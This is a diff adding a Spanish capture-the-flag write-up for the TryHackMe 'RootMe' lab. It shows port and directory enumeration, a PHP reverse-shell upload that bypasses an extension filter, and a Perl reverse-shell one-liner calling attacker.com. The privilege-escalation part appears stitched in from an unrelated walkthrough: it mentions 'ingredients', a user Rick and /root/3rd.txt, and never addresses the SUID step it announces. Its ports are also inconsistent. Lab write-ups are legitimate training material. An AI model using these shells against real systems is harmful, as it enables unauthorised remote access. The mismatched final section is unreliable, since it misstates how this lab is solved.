@@ -1,0 +1,244 @@
+I"tG<p>La máquina RootMe, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean:</p>
+
+<ul>
+  <li>¿Cuántos puertos están abiertos?<br />
+  *</li>
+  <li>¿Qué versión de Apache está corriendo?<br />
+  2.*.**</li>
+  <li>¿Qué servicio corre en el puerto 22?<br />
+  S**</li>
+  <li>Mediante alguna herramienrta de numeración encuentra directorios. ¿Cuál es el directorio oculto?<br />
+  /p????/</li>
+  <li>user.txt <br />
+  THM{y?????????l}</li>
+  <li>Busca archivos que tengan permisos SUID. De ellos, ¿cuál es el archivo raro?<br />                 /u??/???/?????</li>
+  <li>Encuentra una forma de escalar privilegios para encontrar root.txt <br />
+  THM{p???????_?????????n}</li>
+</ul>
+
+<h1 id="enumeración"><a href="#header-1"></a>Enumeración</h1>
+
+<p>La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.</p>
+
+<p>Usaremos nmap para analizar los puertos abiertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nv">$IP</span><span class="nt">-VICTIMA</span> <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Escaneo todos los puertos abiertos: -p- –open</p>
+  </li>
+  <li>
+    <p>Mediante –min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.</p>
+  </li>
+  <li>
+    <p>Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.</p>
+  </li>
+  <li>
+    <p>Para que el escaneo no aplique resolución DNS usamos -n</p>
+  </li>
+  <li>
+    <p>En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.252.141 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-12 07:11 EDT
+Initiating Ping Scan at 07:11
+Scanning 10.10.252.141 <span class="o">[</span>2 ports]
+Completed Ping Scan at 07:11, 0.04s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating Connect Scan at 07:11
+Scanning 10.10.252.141 <span class="o">[</span>65535 ports]
+Discovered open port 22/tcp on 10.10.252.141
+Discovered open port 80/tcp on 10.10.252.141
+Completed Connect Scan at 07:11, 11.78s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.252.141
+Host is up, received syn-ack <span class="o">(</span>0.049s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-10-12 07:11:31 EDT <span class="k">for </span>12s
+Not shown: 65146 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, 387 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.88 seconds 
+</code></pre></div></div>
+
+<p>El escaneo nos reporta dos puertos abiertos, el 22 y el 80, así como el servicio que corre en cada uno de ellos.</p>
+
+<p>Conseguimos así la primera pregunta, 2 puertos abiertos</p>
+
+<p>Como nos piden la version de Apache podemos hacer whatweb para ver lo que nos reporta:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb 10.10.252.141
+http://10.10.252.141 <span class="o">[</span>200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.252.141], Script, Title[HackIT - Home]
+</code></pre></div></div>
+
+<p>Vemos que es la versión 2.4.29 y conseguimos la segunda pregunta.</p>
+
+<p>El servicio del puerto 22 ya nos lo reporta el esacneo anterior pero para obtener un poco más de información podemos hacer:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.252.141 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-10-12 07:16 EDT
+Nmap scan report <span class="k">for </span>10.10.252.141
+Host is up <span class="o">(</span>0.046s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set</span>
+|_http-title: HackIT - Home
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>8.49 seconds
+<span class="o">[</span>1]    10554 segmentation fault  nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.252.141 <span class="nt">-oN</span> targeted
+</code></pre></div></div>
+<p>Debido a que el puerto 80 está abierto, nos metemos en la dirección $IP-VICTIMA y vemos un texto que dice: <strong>Can you root me?</strong></p>
+
+<p>A continuación pasamos a la siguiente pregunta en la que tenemos que encontrar el directorio oculto. Para ello mediante la herramineta gobuster hacemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.252.141/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-t</span> 25 <span class="nt">-x</span> php,html,txt 
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.252.141/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 25
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              txt,php,html
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/10/12 07:20:07 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htaccess.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htaccess.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.htaccess.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.hta.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.hta.html            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/.hta.txt             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.252.141/css/]
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 616]                                
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 616]                                
+/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.252.141/js/] 
+/p????                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.252.141/p????/]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]                                  
+/uploads              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.252.141/uploads/]
+                                                                                   
+<span class="o">===============================================================</span>
+2022/10/12 07:20:45 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>Buscamos los directorios de la $IP-VICTIMA usando el archivo de lista de palabras directory-list1.0.txt</p>
+
+<p>En este punto podríamos usar cualquier lista de palabras.</p>
+
+<p>Encontramos el directorio oculto que sabemos que empieza por /p????</p>
+
+<p>Nos metemos en el directorio oculto desde el navegador y parece que podemos subir archivos, probaremos entonces a conseguir una reverse shell mediante este método.</p>
+
+<p>Primero comprobaremos que se pueden subir imagenes correctamente. Para ello, tras subirla en /p???? nos dirigimos al directorio /uploads que hemos reconocido en el paso anterior con gobuster.</p>
+
+<p>La imagen aparece en el panel de /uploads por lo que si que nos deja. El siguiente paso será descargarnos una php reverse shell. En mi caso lo he hecho desde &lt;a href=https://pentestmonkey.net/tools/web-shells/php-reverse-shell&gt; Pentest Monkey&lt;/a&gt;</p>
+
+<p>Una vez descargada modificamos el archivo .php, tanto el puerto, por ejemplo el 4444 como el valor $ip. <strong>¡Debe ser tu IP!</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'$MY-IP'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">4444</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+<p>Desde la máquina atcante nos ponemos en escucha por el puerto 4444 con nc:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+</code></pre></div></div>
+
+<p>Agregamos nuestra reverse shell con extension .php5 porque con php no nos deja y le damos a upload.</p>
+
+<p>Nos dice que todo ha ido correcto y nos metemos en el panel de /uploads. Ahí se encunetra el archivo .php5</p>
+
+<p>Lo ejecutamos estando en escucha y…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-lnvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.8.79.39] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.252.141] 55654
+Linux rootme 4.15.0-112-generic <span class="c">#113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 11:55:39 up  1:09,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ 
+</span></code></pre></div></div>
+
+<p>Conseguimos acceso a la máquina víctima</p>
+
+<h1 id="escalada-de-privilegios"><a href="$header-1"></a>Escalada de privilegios</h1>
+
+<p>Buscamos un archivo en el sistema que se llame user.txt y lo abrimos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-name</span> user.txt 2&gt;/dev/null
+/var/www/user.txt
+<span class="nv">$ </span><span class="nb">cat</span> /var/www/user.txt
+THM<span class="o">{</span>???_???_?_?????<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Ahora debemos obtener una reverse shell. Intentamos realizar una bash reverse shell pero no funciona por lo que lo intento con perl. Entramos en <a href="https://gtfobins.github.io/">gtfobins</a> para poder buscar la reverse shell con perl.</p>
+
+<p>Desde la máquina atacante nos ponemos en escucha por el puerto 444 con nc:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4444
+</code></pre></div></div>
+
+<p>Por otro lado, desde la máquina víctima introducimos la perl reverse shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">RHOST</span><span class="o">=</span>attacker.com
+<span class="nb">export </span><span class="nv">RPORT</span><span class="o">=</span>12345
+perl <span class="nt">-e</span> <span class="s1">'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+</code></pre></div></div>
+
+<p>Obtenemos así la reverse shell y podemos ejecutar comandos desde la máquina atacante.</p>
+
+<p>Abrimos el archivo “second ingredients” y obtenemos el segundo ingrediente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="s1">'second ingredients'</span>
+</code></pre></div></div>
+
+<p>Con sudo -l podemos observar los permisos que tiene el usuario Rick a la hora de ejecutar comandos. En este caso podemos realizar todos los comandos como sudo por lo que listamos lo que hay en el usuario root mediante:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo ls</span> /root/ y vemos un archivo txt
+</code></pre></div></div>
+
+<p>Lo abrimos y obtenemos el último ingrediente!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo cat</span> /root/3rd.txt
+</code></pre></div></div>
+
+<p>Muchas gracias por leer este writeup, espero que te haya gustado!</p>
+:ET
